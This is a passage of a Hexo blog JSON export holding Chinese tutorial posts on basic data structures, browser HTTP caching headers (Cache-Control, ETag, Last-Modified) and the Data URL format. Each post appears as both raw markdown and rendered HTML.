二叉树和二叉查找树\n\n* 树是一种非线性结构，以分层的方式存储数据。\n* 二叉树每个节点的子节点不允许超过两个。\n* 一个父节点的两个子节点分别称为左节点和右节点，通过将子节点的个数限定为 2 个，可以高效插入，查找，删除。\n* 二叉查找树（BST）是一种特殊得二叉树，相对较小的值保存在左节点中，较大的值保存在右节点中。这一特性使得查找的效率很高。\n","source":"_posts/study-data.md","raw":"---\ntitle: 浅谈各种数据结构\ndate: 2018-04-17 10:58:35\ntags: 数据结构与算法\n---\n\n> 列表，栈，队列，链表，字典，散列，图，二叉查找树\n\n## 列表\n\n* 日常生活中：购物清单，待办事项列表等\n* 数据结构较为简单\n* 不需要在一个长序列中查找元素，或者对其进行排序\n\n## 栈\n\n* 栈是一种特殊的列表，只能通过列表的一端进行访问，这一端被称为栈顶\n* 餐厅里的盘子叠在一起，从最上面取盘子，洗完也只能放在上面\n* 所以他是先进后出，后入先出的高效数据结构，因为数据只能在栈顶添加或删除，所以操作很快\n* 比如函数调用栈\n\n## 队列\n\n* 队列也是一种特殊的列表\n* 只能在队尾添加元素（入队），只能在队头删除元素（出队）\n* 我们在银行排队，排在最前面的人第一个办理业务，然后出去\n\n## 链表\n\n* 链表也是一种特殊的列表\n* 每个节点存下个节点的指针\n* 有双向链表，单向链表，循环链表\n\n## 字典\n\n* 键值对的存储结构\n\n## 散列\n\n* （散列）哈希表是一种常用的数据结构，散列后的数据可以快速插入\n* 在散列表上插入，删除都非常快，但是查找效率非常低\n* 查找一组数组中的最大值和最小值，一般要求助于其他数据结构，比如二叉查找树\n* 即使一个高效的散列函数，也可能将两个键映射为同一个值的可能，这种现象叫碰撞。常见碰撞的处理方法：开链法和线性探测法\n\n## 图\n\n* 图是由边的集合和顶点的集合组成\n* 两个城镇由某种道路相连，每个城镇是一个顶点，道路就是边\n* 顶点也有权重，也叫成本\n* 如果一个图的顶点对是有序的：有向图==流程图\n* 如果无序，就是无序图\n* 搜索图的算法：深度优先搜素和广度优先搜索\n\n## 二叉树和二叉查找树\n\n* 树是一种非线性结构，以分层的方式存储数据。\n* 二叉树每个节点的子节点不允许超过两个。\n* 一个父节点的两个子节点分别称为左节点和右节点，通过将子节点的个数限定为 2 个，可以高效插入，查找，删除。\n* 二叉查找树（BST）是一种特殊得二叉树，相对较小的值保存在左节点中，较大的值保存在右节点中。这一特性使得查找的效率很高。\n","slug":"study-data","published":1,"updated":"2018-04-20T07:15:58.796Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034qi00290iof2omuks02","content":"<blockquote>\n<p>列表，栈，队列，链表，字典，散列，图，二叉查找树</p>\n</blockquote>\n<h2 id=\"列表\"><a href=\"#列表\" class=\"headerlink\" title=\"列表\"></a>列表</h2><ul>\n<li>日常生活中：购物清单，待办事项列表等</li>\n<li>数据结构较为简单</li>\n<li>不需要在一个长序列中查找元素，或者对其进行排序</li>\n</ul>\n<h2 id=\"栈\"><a href=\"#栈\" class=\"headerlink\" title=\"栈\"></a>栈</h2><ul>\n<li>栈是一种特殊的列表，只能通过列表的一端进行访问，这一端被称为栈顶</li>\n<li>餐厅里的盘子叠在一起，从最上面取盘子，洗完也只能放在上面</li>\n<li>所以他是先进后出，后入先出的高效数据结构，因为数据只能在栈顶添加或删除，所以操作很快</li>\n<li>比如函数调用栈</li>\n</ul>\n<h2 id=\"队列\"><a href=\"#队列\" class=\"headerlink\" title=\"队列\"></a>队列</h2><ul>\n<li>队列也是一种特殊的列表</li>\n<li>只能在队尾添加元素（入队），只能在队头删除元素（出队）</li>\n<li>我们在银行排队，排在最前面的人第一个办理业务，然后出去</li>\n</ul>\n<h2 id=\"链表\"><a href=\"#链表\" class=\"headerlink\" title=\"链表\"></a>链表</h2><ul>\n<li>链表也是一种特殊的列表</li>\n<li>每个节点存下个节点的指针</li>\n<li>有双向链表，单向链表，循环链表</li>\n</ul>\n<h2 id=\"字典\"><a href=\"#字典\" class=\"headerlink\" title=\"字典\"></a>字典</h2><ul>\n<li>键值对的存储结构</li>\n</ul>\n<h2 id=\"散列\"><a href=\"#散列\" class=\"headerlink\" title=\"散列\"></a>散列</h2><ul>\n<li>（散列）哈希表是一种常用的数据结构，散列后的数据可以快速插入</li>\n<li>在散列表上插入，删除都非常快，但是查找效率非常低</li>\n<li>查找一组数组中的最大值和最小值，一般要求助于其他数据结构，比如二叉查找树</li>\n<li>即使一个高效的散列函数，也可能将两个键映射为同一个值的可能，这种现象叫碰撞。常见碰撞的处理方法：开链法和线性探测法</li>\n</ul>\n<h2 id=\"图\"><a href=\"#图\" class=\"headerlink\" title=\"图\"></a>图</h2><ul>\n<li>图是由边的集合和顶点的集合组成</li>\n<li>两个城镇由某种道路相连，每个城镇是一个顶点，道路就是边</li>\n<li>顶点也有权重，也叫成本</li>\n<li>如果一个图的顶点对是有序的：有向图==流程图</li>\n<li>如果无序，就是无序图</li>\n<li>搜索图的算法：深度优先搜素和广度优先搜索</li>\n</ul>\n<h2 id=\"二叉树和二叉查找树\"><a href=\"#二叉树和二叉查找树\" class=\"headerlink\" title=\"二叉树和二叉查找树\"></a>二叉树和二叉查找树</h2><ul>\n<li>树是一种非线性结构，以分层的方式存储数据。</li>\n<li>二叉树每个节点的子节点不允许超过两个。</li>\n<li>一个父节点的两个子节点分别称为左节点和右节点，通过将子节点的个数限定为 2 个，可以高效插入，查找，删除。</li>\n<li>二叉查找树（BST）是一种特殊得二叉树，相对较小的值保存在左节点中，较大的值保存在右节点中。这一特性使得查找的效率很高。</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<blockquote>\n<p>列表，栈，队列，链表，字典，散列，图，二叉查找树</p>\n</blockquote>\n<h2 id=\"列表\"><a href=\"#列表\" class=\"headerlink\" title=\"列表\"></a>列表</h2><ul>\n<li>日常生活中：购物清单，待办事项列表等</li>\n<li>数据结构较为简单</li>\n<li>不需要在一个长序列中查找元素，或者对其进行排序</li>\n</ul>\n<h2 id=\"栈\"><a href=\"#栈\" class=\"headerlink\" title=\"栈\"></a>栈</h2><ul>\n<li>栈是一种特殊的列表，只能通过列表的一端进行访问，这一端被称为栈顶</li>\n<li>餐厅里的盘子叠在一起，从最上面取盘子，洗完也只能放在上面</li>\n<li>所以他是先进后出，后入先出的高效数据结构，因为数据只能在栈顶添加或删除，所以操作很快</li>\n<li>比如函数调用栈</li>\n</ul>\n<h2 id=\"队列\"><a href=\"#队列\" class=\"headerlink\" title=\"队列\"></a>队列</h2><ul>\n<li>队列也是一种特殊的列表</li>\n<li>只能在队尾添加元素（入队），只能在队头删除元素（出队）</li>\n<li>我们在银行排队，排在最前面的人第一个办理业务，然后出去</li>\n</ul>\n<h2 id=\"链表\"><a href=\"#链表\" class=\"headerlink\" title=\"链表\"></a>链表</h2><ul>\n<li>链表也是一种特殊的列表</li>\n<li>每个节点存下个节点的指针</li>\n<li>有双向链表，单向链表，循环链表</li>\n</ul>\n<h2 id=\"字典\"><a href=\"#字典\" class=\"headerlink\" title=\"字典\"></a>字典</h2><ul>\n<li>键值对的存储结构</li>\n</ul>\n<h2 id=\"散列\"><a href=\"#散列\" class=\"headerlink\" title=\"散列\"></a>散列</h2><ul>\n<li>（散列）哈希表是一种常用的数据结构，散列后的数据可以快速插入</li>\n<li>在散列表上插入，删除都非常快，但是查找效率非常低</li>\n<li>查找一组数组中的最大值和最小值，一般要求助于其他数据结构，比如二叉查找树</li>\n<li>即使一个高效的散列函数，也可能将两个键映射为同一个值的可能，这种现象叫碰撞。常见碰撞的处理方法：开链法和线性探测法</li>\n</ul>\n<h2 id=\"图\"><a href=\"#图\" class=\"headerlink\" title=\"图\"></a>图</h2><ul>\n<li>图是由边的集合和顶点的集合组成</li>\n<li>两个城镇由某种道路相连，每个城镇是一个顶点，道路就是边</li>\n<li>顶点也有权重，也叫成本</li>\n<li>如果一个图的顶点对是有序的：有向图==流程图</li>\n<li>如果无序，就是无序图</li>\n<li>搜索图的算法：深度优先搜素和广度优先搜索</li>\n</ul>\n<h2 id=\"二叉树和二叉查找树\"><a href=\"#二叉树和二叉查找树\" class=\"headerlink\" title=\"二叉树和二叉查找树\"></a>二叉树和二叉查找树</h2><ul>\n<li>树是一种非线性结构，以分层的方式存储数据。</li>\n<li>二叉树每个节点的子节点不允许超过两个。</li>\n<li>一个父节点的两个子节点分别称为左节点和右节点，通过将子节点的个数限定为 2 个，可以高效插入，查找，删除。</li>\n<li>二叉查找树（BST）是一种特殊得二叉树，相对较小的值保存在左节点中，较大的值保存在右节点中。这一特性使得查找的效率很高。</li>\n</ul>\n"},{"title":"浅谈前端缓存(一)","date":"2018-05-11T05:51:21.000Z","_content":"\n## 为什么需要前端缓存\n\n* 重复利用资源，提高网页打开资源\n* 减少 http 请求，减少网络带宽\n\n## 两种缓存\n\n> 200(from cache)和 304（not modified）\n\n* 强缓存：200(from cache)强缓存命中不会发送请求到服务端，直接从本地缓存中获取资源\n* 协商缓存：会发送请求到服务器，服务器通过请求头部字段来验证资源是否命中协商缓存，如果命中，返回 304,通知浏览器从缓存中获取资源\n\n## 与缓存策略相关的字段\n\n> 三个字段 Cache-Control,Pragma,Expires(过期时间)，下面介绍一下响应头中的\n\n### Cache-Control\n\n> http1.1 新增的字段，是控制浏览器缓存的主要字段。\n\n* no-cache：资源可以被缓存，但是立刻过期，下次访问必须验证资源有效性\n* max-age：缓存资源，在指定时间（是 res 里面的 Date 字段）后过期，单位是秒\n* no-store：资源不会被缓存\n* public：资源可以被浏览器和代理服务器缓存\n* private:资源只能被浏览器缓存\n\n### Pragma\n\n* 是 http1.0 的字段，只有一个值 no-cache，功能和 Cache-control:no-cache；一样，但是优先级比他低。\n\n### Expires\n\n* 是缓存到期时间，是一个服务器的绝对时间，由于时区的误差等因素已经较少使用。优先级比 Cache-control:max-age 低。\n\n## 强缓存命中条件\n\n* 有些场景下必须避免浏览器缓存，响应头可以这样设置：Cache-Control: no-cache, no-store, must-revalidate(必须验证)\n* 公开资源直接命中强缓存，这是响应最快的。\n  * 请求头部不包括 Pragma 字段\n  * 响应头部 Cache-Control 中不包括 no-cache、no-store\n  * 响应头部 max-age 或者 expire 大于请求日期\n* 如果我们在很短的一段时间内多次访问同一个资源，并且响应头部却没有 max-age 或者 expires 信息，是不是就不会命中强缓存？不是的，浏览器会做出优化，默认会使用一个启发式算法，取响应头(Date-Last-Modified)\\*0.1 作为缓存的有效时间（其实就相当于 max-age），只要在这段时间内请求这个资源，即使没有缓存过期字段，也会命中强缓存\n\n## 协商缓存命中条件\n\n### Last-Modified/If-Modified-Since\n\n* 响应头会有一个 Last-Modified，代表这个资源最后修改的时间。\n* 当浏览器再次向服务器请求该资源的时候，会传送 If-Modified-Since（也就是上次服务器传送过来的 Last-Modified），服务器会拿这个值跟本地资源实际最后修改时间作比较，如果文件没有被修改，那么返回 304，通知浏览器从缓存中读取文件。\n\n### ETag/If-None-Match\n\n* ETag 是一个响应首部字段，他是根据资源内容生成的一段 hash 值，标识资源的状态，由服务器产生。\n* 当浏览器再次向服务器端请求这个资源，会带上 If-None-Match（其实就是上次服务器发过来的 ETag 的 hash 值），服务器收到后，会拿这个值和资源实际的 ETag 做比较。\n* 如果一样就命中协商缓存，返回 304\n\n#### ETag 的优先级比 Last-Modified 高\n\n* 本来已经有了一个 Last-Modified，为什么还需要 ETag？\n* 这是因为 Last-Modified 只能精确到秒，而如果我们在服务器一秒内多次更改资源，那么将无法识别，还是会命中协商缓存\n* 而且某些服务器不能精确得到文件的最后修改时间\n* 一些文件或许会周期性被更改，但是他内容并没有改变，只是改变了修改时间，这个时候我们并不希望浏览器重新请求这个资源\n","source":"_posts/study-cache.md","raw":"---\ntitle: 浅谈前端缓存(一)\ndate: 2018-05-11 13:51:21\ntags: 浏览器\n---\n\n## 为什么需要前端缓存\n\n* 重复利用资源，提高网页打开资源\n* 减少 http 请求，减少网络带宽\n\n## 两种缓存\n\n> 200(from cache)和 304（not modified）\n\n* 强缓存：200(from cache)强缓存命中不会发送请求到服务端，直接从本地缓存中获取资源\n* 协商缓存：会发送请求到服务器，服务器通过请求头部字段来验证资源是否命中协商缓存，如果命中，返回 304,通知浏览器从缓存中获取资源\n\n## 与缓存策略相关的字段\n\n> 三个字段 Cache-Control,Pragma,Expires(过期时间)，下面介绍一下响应头中的\n\n### Cache-Control\n\n> http1.1 新增的字段，是控制浏览器缓存的主要字段。\n\n* no-cache：资源可以被缓存，但是立刻过期，下次访问必须验证资源有效性\n* max-age：缓存资源，在指定时间（是 res 里面的 Date 字段）后过期，单位是秒\n* no-store：资源不会被缓存\n* public：资源可以被浏览器和代理服务器缓存\n* private:资源只能被浏览器缓存\n\n### Pragma\n\n* 是 http1.0 的字段，只有一个值 no-cache，功能和 Cache-control:no-cache；一样，但是优先级比他低。\n\n### Expires\n\n* 是缓存到期时间，是一个服务器的绝对时间，由于时区的误差等因素已经较少使用。优先级比 Cache-control:max-age 低。\n\n## 强缓存命中条件\n\n* 有些场景下必须避免浏览器缓存，响应头可以这样设置：Cache-Control: no-cache, no-store, must-revalidate(必须验证)\n* 公开资源直接命中强缓存，这是响应最快的。\n  * 请求头部不包括 Pragma 字段\n  * 响应头部 Cache-Control 中不包括 no-cache、no-store\n  * 响应头部 max-age 或者 expire 大于请求日期\n* 如果我们在很短的一段时间内多次访问同一个资源，并且响应头部却没有 max-age 或者 expires 信息，是不是就不会命中强缓存？不是的，浏览器会做出优化，默认会使用一个启发式算法，取响应头(Date-Last-Modified)\\*0.1 作为缓存的有效时间（其实就相当于 max-age），只要在这段时间内请求这个资源，即使没有缓存过期字段，也会命中强缓存\n\n## 协商缓存命中条件\n\n### Last-Modified/If-Modified-Since\n\n* 响应头会有一个 Last-Modified，代表这个资源最后修改的时间。\n* 当浏览器再次向服务器请求该资源的时候，会传送 If-Modified-Since（也就是上次服务器传送过来的 Last-Modified），服务器会拿这个值跟本地资源实际最后修改时间作比较，如果文件没有被修改，那么返回 304，通知浏览器从缓存中读取文件。\n\n### ETag/If-None-Match\n\n* ETag 是一个响应首部字段，他是根据资源内容生成的一段 hash 值，标识资源的状态，由服务器产生。\n* 当浏览器再次向服务器端请求这个资源，会带上 If-None-Match（其实就是上次服务器发过来的 ETag 的 hash 值），服务器收到后，会拿这个值和资源实际的 ETag 做比较。\n* 如果一样就命中协商缓存，返回 304\n\n#### ETag 的优先级比 Last-Modified 高\n\n* 本来已经有了一个 Last-Modified，为什么还需要 ETag？\n* 这是因为 Last-Modified 只能精确到秒，而如果我们在服务器一秒内多次更改资源，那么将无法识别，还是会命中协商缓存\n* 而且某些服务器不能精确得到文件的最后修改时间\n* 一些文件或许会周期性被更改，但是他内容并没有改变，只是改变了修改时间，这个时候我们并不希望浏览器重新请求这个资源\n","slug":"study-cache","published":1,"updated":"2018-05-13T06:34:15.303Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034qk002b0iofo6vlogp4","content":"<h2 id=\"为什么需要前端缓存\"><a href=\"#为什么需要前端缓存\" class=\"headerlink\" title=\"为什么需要前端缓存\"></a>为什么需要前端缓存</h2><ul>\n<li>重复利用资源，提高网页打开资源</li>\n<li>减少 http 请求，减少网络带宽</li>\n</ul>\n<h2 id=\"两种缓存\"><a href=\"#两种缓存\" class=\"headerlink\" title=\"两种缓存\"></a>两种缓存</h2><blockquote>\n<p>200(from cache)和 304（not modified）</p>\n</blockquote>\n<ul>\n<li>强缓存：200(from cache)强缓存命中不会发送请求到服务端，直接从本地缓存中获取资源</li>\n<li>协商缓存：会发送请求到服务器，服务器通过请求头部字段来验证资源是否命中协商缓存，如果命中，返回 304,通知浏览器从缓存中获取资源</li>\n</ul>\n<h2 id=\"与缓存策略相关的字段\"><a href=\"#与缓存策略相关的字段\" class=\"headerlink\" title=\"与缓存策略相关的字段\"></a>与缓存策略相关的字段</h2><blockquote>\n<p>三个字段 Cache-Control,Pragma,Expires(过期时间)，下面介绍一下响应头中的</p>\n</blockquote>\n<h3 id=\"Cache-Control\"><a href=\"#Cache-Control\" class=\"headerlink\" title=\"Cache-Control\"></a>Cache-Control</h3><blockquote>\n<p>http1.1 新增的字段，是控制浏览器缓存的主要字段。</p>\n</blockquote>\n<ul>\n<li>no-cache：资源可以被缓存，但是立刻过期，下次访问必须验证资源有效性</li>\n<li>max-age：缓存资源，在指定时间（是 res 里面的 Date 字段）后过期，单位是秒</li>\n<li>no-store：资源不会被缓存</li>\n<li>public：资源可以被浏览器和代理服务器缓存</li>\n<li>private:资源只能被浏览器缓存</li>\n</ul>\n<h3 id=\"Pragma\"><a href=\"#Pragma\" class=\"headerlink\" title=\"Pragma\"></a>Pragma</h3><ul>\n<li>是 http1.0 的字段，只有一个值 no-cache，功能和 Cache-control:no-cache；一样，但是优先级比他低。</li>\n</ul>\n<h3 id=\"Expires\"><a href=\"#Expires\" class=\"headerlink\" title=\"Expires\"></a>Expires</h3><ul>\n<li>是缓存到期时间，是一个服务器的绝对时间，由于时区的误差等因素已经较少使用。优先级比 Cache-control:max-age 低。</li>\n</ul>\n<h2 id=\"强缓存命中条件\"><a href=\"#强缓存命中条件\" class=\"headerlink\" title=\"强缓存命中条件\"></a>强缓存命中条件</h2><ul>\n<li>有些场景下必须避免浏览器缓存，响应头可以这样设置：Cache-Control: no-cache, no-store, must-revalidate(必须验证)</li>\n<li>公开资源直接命中强缓存，这是响应最快的。<ul>\n<li>请求头部不包括 Pragma 字段</li>\n<li>响应头部 Cache-Control 中不包括 no-cache、no-store</li>\n<li>响应头部 max-age 或者 expire 大于请求日期</li>\n</ul>\n</li>\n<li>如果我们在很短的一段时间内多次访问同一个资源，并且响应头部却没有 max-age 或者 expires 信息，是不是就不会命中强缓存？不是的，浏览器会做出优化，默认会使用一个启发式算法，取响应头(Date-Last-Modified)*0.1 作为缓存的有效时间（其实就相当于 max-age），只要在这段时间内请求这个资源，即使没有缓存过期字段，也会命中强缓存</li>\n</ul>\n<h2 id=\"协商缓存命中条件\"><a href=\"#协商缓存命中条件\" class=\"headerlink\" title=\"协商缓存命中条件\"></a>协商缓存命中条件</h2><h3 id=\"Last-Modified-If-Modified-Since\"><a href=\"#Last-Modified-If-Modified-Since\" class=\"headerlink\" title=\"Last-Modified/If-Modified-Since\"></a>Last-Modified/If-Modified-Since</h3><ul>\n<li>响应头会有一个 Last-Modified，代表这个资源最后修改的时间。</li>\n<li>当浏览器再次向服务器请求该资源的时候，会传送 If-Modified-Since（也就是上次服务器传送过来的 Last-Modified），服务器会拿这个值跟本地资源实际最后修改时间作比较，如果文件没有被修改，那么返回 304，通知浏览器从缓存中读取文件。</li>\n</ul>\n<h3 id=\"ETag-If-None-Match\"><a href=\"#ETag-If-None-Match\" class=\"headerlink\" title=\"ETag/If-None-Match\"></a>ETag/If-None-Match</h3><ul>\n<li>ETag 是一个响应首部字段，他是根据资源内容生成的一段 hash 值，标识资源的状态，由服务器产生。</li>\n<li>当浏览器再次向服务器端请求这个资源，会带上 If-None-Match（其实就是上次服务器发过来的 ETag 的 hash 值），服务器收到后，会拿这个值和资源实际的 ETag 做比较。</li>\n<li>如果一样就命中协商缓存，返回 304</li>\n</ul>\n<h4 id=\"ETag-的优先级比-Last-Modified-高\"><a href=\"#ETag-的优先级比-Last-Modified-高\" class=\"headerlink\" title=\"ETag 的优先级比 Last-Modified 高\"></a>ETag 的优先级比 Last-Modified 高</h4><ul>\n<li>本来已经有了一个 Last-Modified，为什么还需要 ETag？</li>\n<li>这是因为 Last-Modified 只能精确到秒，而如果我们在服务器一秒内多次更改资源，那么将无法识别，还是会命中协商缓存</li>\n<li>而且某些服务器不能精确得到文件的最后修改时间</li>\n<li>一些文件或许会周期性被更改，但是他内容并没有改变，只是改变了修改时间，这个时候我们并不希望浏览器重新请求这个资源</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"为什么需要前端缓存\"><a href=\"#为什么需要前端缓存\" class=\"headerlink\" title=\"为什么需要前端缓存\"></a>为什么需要前端缓存</h2><ul>\n<li>重复利用资源，提高网页打开资源</li>\n<li>减少 http 请求，减少网络带宽</li>\n</ul>\n<h2 id=\"两种缓存\"><a href=\"#两种缓存\" class=\"headerlink\" title=\"两种缓存\"></a>两种缓存</h2><blockquote>\n<p>200(from cache)和 304（not modified）</p>\n</blockquote>\n<ul>\n<li>强缓存：200(from cache)强缓存命中不会发送请求到服务端，直接从本地缓存中获取资源</li>\n<li>协商缓存：会发送请求到服务器，服务器通过请求头部字段来验证资源是否命中协商缓存，如果命中，返回 304,通知浏览器从缓存中获取资源</li>\n</ul>\n<h2 id=\"与缓存策略相关的字段\"><a href=\"#与缓存策略相关的字段\" class=\"headerlink\" title=\"与缓存策略相关的字段\"></a>与缓存策略相关的字段</h2><blockquote>\n<p>三个字段 Cache-Control,Pragma,Expires(过期时间)，下面介绍一下响应头中的</p>\n</blockquote>\n<h3 id=\"Cache-Control\"><a href=\"#Cache-Control\" class=\"headerlink\" title=\"Cache-Control\"></a>Cache-Control</h3><blockquote>\n<p>http1.1 新增的字段，是控制浏览器缓存的主要字段。</p>\n</blockquote>\n<ul>\n<li>no-cache：资源可以被缓存，但是立刻过期，下次访问必须验证资源有效性</li>\n<li>max-age：缓存资源，在指定时间（是 res 里面的 Date 字段）后过期，单位是秒</li>\n<li>no-store：资源不会被缓存</li>\n<li>public：资源可以被浏览器和代理服务器缓存</li>\n<li>private:资源只能被浏览器缓存</li>\n</ul>\n<h3 id=\"Pragma\"><a href=\"#Pragma\" class=\"headerlink\" title=\"Pragma\"></a>Pragma</h3><ul>\n<li>是 http1.0 的字段，只有一个值 no-cache，功能和 Cache-control:no-cache；一样，但是优先级比他低。</li>\n</ul>\n<h3 id=\"Expires\"><a href=\"#Expires\" class=\"headerlink\" title=\"Expires\"></a>Expires</h3><ul>\n<li>是缓存到期时间，是一个服务器的绝对时间，由于时区的误差等因素已经较少使用。优先级比 Cache-control:max-age 低。</li>\n</ul>\n<h2 id=\"强缓存命中条件\"><a href=\"#强缓存命中条件\" class=\"headerlink\" title=\"强缓存命中条件\"></a>强缓存命中条件</h2><ul>\n<li>有些场景下必须避免浏览器缓存，响应头可以这样设置：Cache-Control: no-cache, no-store, must-revalidate(必须验证)</li>\n<li>公开资源直接命中强缓存，这是响应最快的。<ul>\n<li>请求头部不包括 Pragma 字段</li>\n<li>响应头部 Cache-Control 中不包括 no-cache、no-store</li>\n<li>响应头部 max-age 或者 expire 大于请求日期</li>\n</ul>\n</li>\n<li>如果我们在很短的一段时间内多次访问同一个资源，并且响应头部却没有 max-age 或者 expires 信息，是不是就不会命中强缓存？不是的，浏览器会做出优化，默认会使用一个启发式算法，取响应头(Date-Last-Modified)*0.1 作为缓存的有效时间（其实就相当于 max-age），只要在这段时间内请求这个资源，即使没有缓存过期字段，也会命中强缓存</li>\n</ul>\n<h2 id=\"协商缓存命中条件\"><a href=\"#协商缓存命中条件\" class=\"headerlink\" title=\"协商缓存命中条件\"></a>协商缓存命中条件</h2><h3 id=\"Last-Modified-If-Modified-Since\"><a href=\"#Last-Modified-If-Modified-Since\" class=\"headerlink\" title=\"Last-Modified/If-Modified-Since\"></a>Last-Modified/If-Modified-Since</h3><ul>\n<li>响应头会有一个 Last-Modified，代表这个资源最后修改的时间。</li>\n<li>当浏览器再次向服务器请求该资源的时候，会传送 If-Modified-Since（也就是上次服务器传送过来的 Last-Modified），服务器会拿这个值跟本地资源实际最后修改时间作比较，如果文件没有被修改，那么返回 304，通知浏览器从缓存中读取文件。</li>\n</ul>\n<h3 id=\"ETag-If-None-Match\"><a href=\"#ETag-If-None-Match\" class=\"headerlink\" title=\"ETag/If-None-Match\"></a>ETag/If-None-Match</h3><ul>\n<li>ETag 是一个响应首部字段，他是根据资源内容生成的一段 hash 值，标识资源的状态，由服务器产生。</li>\n<li>当浏览器再次向服务器端请求这个资源，会带上 If-None-Match（其实就是上次服务器发过来的 ETag 的 hash 值），服务器收到后，会拿这个值和资源实际的 ETag 做比较。</li>\n<li>如果一样就命中协商缓存，返回 304</li>\n</ul>\n<h4 id=\"ETag-的优先级比-Last-Modified-高\"><a href=\"#ETag-的优先级比-Last-Modified-高\" class=\"headerlink\" title=\"ETag 的优先级比 Last-Modified 高\"></a>ETag 的优先级比 Last-Modified 高</h4><ul>\n<li>本来已经有了一个 Last-Modified，为什么还需要 ETag？</li>\n<li>这是因为 Last-Modified 只能精确到秒，而如果我们在服务器一秒内多次更改资源，那么将无法识别，还是会命中协商缓存</li>\n<li>而且某些服务器不能精确得到文件的最后修改时间</li>\n<li>一些文件或许会周期性被更改，但是他内容并没有改变，只是改变了修改时间，这个时候我们并不希望浏览器重新请求这个资源</li>\n</ul>\n"},{"title":"浅谈Data URL","date":"2018-05-01T07:08:38.000Z","_content":"\n## Data URL 是什么\n\n是一种提供让外置资源直接内嵌在页面中的方案。格式如下：\n\n### 格式\n\n```javascript\ndata:[<mime type>][;charset=<charset>][;base64],<encoded data>\n```\n\n* 第一部分是`data：`协议头，它标识这个内容为一个 dataurl 资源\n* 第二部分是 MIME 类型，表示这串内容的展现方式，比如 text/plain，就是文本展示;image/jpeg,就是以 jpeg 图片形式展示，同样浏览器会根据这个 MIME 类型来解析数据。\n* 第三部分是编码设置，默认编码是 charset=US-ASCII，可以在浏览器输入框分别输入下面内容：\n\n```javascript\n// output: &auml;&frac12; &aring;&yen;&frac12; -> 使用默认的编码展示，故乱码\ndata:text/html,你好\n// output: 你好 -> 使用 UTF-8 展示\ndata:text/html;charset=UTF-8,你好\n// output: 浣犲ソ -> 使用 gbk 展示（浏览器默认编码 UTF-8，故乱码）\ndata:text/html;charset=gbk,你好\n// output: 你好 -> UTF-8 编码，内容先使用 base64 解码，然后展示\ndata:text/html;charset=UTF-8;base64,5L2g5aW9\n```\n\n* 第四部分是 base64 编码设定，可选\n* 最后一部分是这个 dataurl 承载的内容，可以是纯文本，也可以是经过 base64 编码的内容\n\n平时我们经常见到的是这样的：\n\n```javascript\n//内嵌base64图片\nbackground-image: url(\"data:image/gif;base64,R0lGODlhAwADAIAAAP///8zMzCH5BAAAAAAALAAAAAADAAMAAAIEBHIJBQA7\");\n```\n\n## Data URL 的优劣\n\n### 优点\n\n* img 的 src 说明这个是外部资源，浏览器会向服务器拉取一次资源请求，占用网络资源\n* 大多数浏览器都有一个并发请求数不能超过 4 个的限制。如果一个网页里嵌入了太多的外部资源，请求会使整个页面加载延迟。\n* 图片体积太小的时候，不值得占用一个 http 会话\n\n### 缺点\n\n* base64 编码的数据体积是原数据的体积 4/3，也就是说 data url 形式的图片会比二进制格式的图片体积大 1/3\n* data url 形式的图片不会被浏览器缓存，这意味着每次访问这样页面的时候都会被下载一次。如果这个图片被整个网站使用，就是一个使用效率问题（已被解决）\n\n  > 如何将 data url 数据放入浏览器缓存，通过 css 样式文件。所有浏览器都会积极缓存 css 文件来提高页面加载效率\n","source":"_posts/study-dataUrl.md","raw":"---\ntitle: 浅谈Data URL\ndate: 2018-05-01 15:08:38\ntags: javascript\n---\n\n## Data URL 是什么\n\n是一种提供让外置资源直接内嵌在页面中的方案。格式如下：\n\n### 格式\n\n```javascript\ndata:[<mime type>][;charset=<charset>][;base64],<encoded data>\n```\n\n* 第一部分是`data：`协议头，它标识这个内容为一个 dataurl 资源\n* 第二部分是 MIME 类型，表示这串内容的展现方式，比如 text/plain，就是文本展示;image/jpeg,就是以 jpeg 图片形式展示，同样浏览器会根据这个 MIME 类型来解析数据。\n* 第三部分是编码设置，默认编码是 charset=US-ASCII，可以在浏览器输入框分别输入下面内容：\n\n```javascript\n// output: &auml;&frac12; &aring;&yen;&frac12; -> 使用默认的编码展示，故乱码\ndata:text/html,你好\n// output: 你好 -> 使用 UTF-8 展示\ndata:text/html;charset=UTF-8,你好\n// output: 浣犲ソ -> 使用 gbk 展示（浏览器默认编码 UTF-8，故乱码）\ndata:text/html;charset=gbk,你好\n// output: 你好 -> UTF-8 编码，内容先使用 base64 解码，然后展示\ndata:text/html;charset=UTF-8;base64,5L2g5aW9\n```\n\n* 第四部分是 base64 编码设定，可选\n* 最后一部分是这个 dataurl 承载的内容，可以是纯文本，也可以是经过 base64 编码的内容\n\n平时我们经常见到的是这样的：\n\n```javascript\n//内嵌base64图片\nbackground-image: url(\"data:image/gif;base64,R0lGODlhAwADAIAAAP///8zMzCH5BAAAAAAALAAAAAADAAMAAAIEBHIJBQA7\");\n```\n\n## Data URL 的优劣\n\n### 优点\n\n* img 的 src 说明这个是外部资源，浏览器会向服务器拉取一次资源请求，占用网络资源\n* 大多数浏览器都有一个并发请求数不能超过 4 个的限制。如果一个网页里嵌入了太多的外部资源，请求会使整个页面加载延迟。\n* 图片体积太小的时候，不值得占用一个 http 会话\n\n### 缺点\n\n* base64 编码的数据体积是原数据的体积 4/3，也就是说 data url 形式的图片会比二进制格式的图片体积大 1/3\n* data url 形式的图片不会被浏览器缓存，这意味着每次访问这样页面的时候都会被下载一次。如果这个图片被整个网站使用，就是一个使用效率问题（已被解决）\n\n  > 如何将 data url 数据放入浏览器缓存，通过 css 样式文件。所有浏览器都会积极缓存 css 文件来提高页面加载效率\n","slug":"study-dataUrl","published":1,"updated":"2018-05-04T13:11:02.662Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034ql002d0iofbxem1ek7","content":"<h2 id=\"Data-URL-是什么\"><a href=\"#Data-URL-是什么\" class=\"headerlink\" title=\"Data URL 是什么\"></a>Data URL 是什么</h2><p>是一种提供让外置资源直接内嵌在页面中的方案。格式如下：</p>\n<h3 id=\"格式\"><a href=\"#格式\" class=\"headerlink\" title=\"格式\"></a>格式</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">data:[&lt;mime 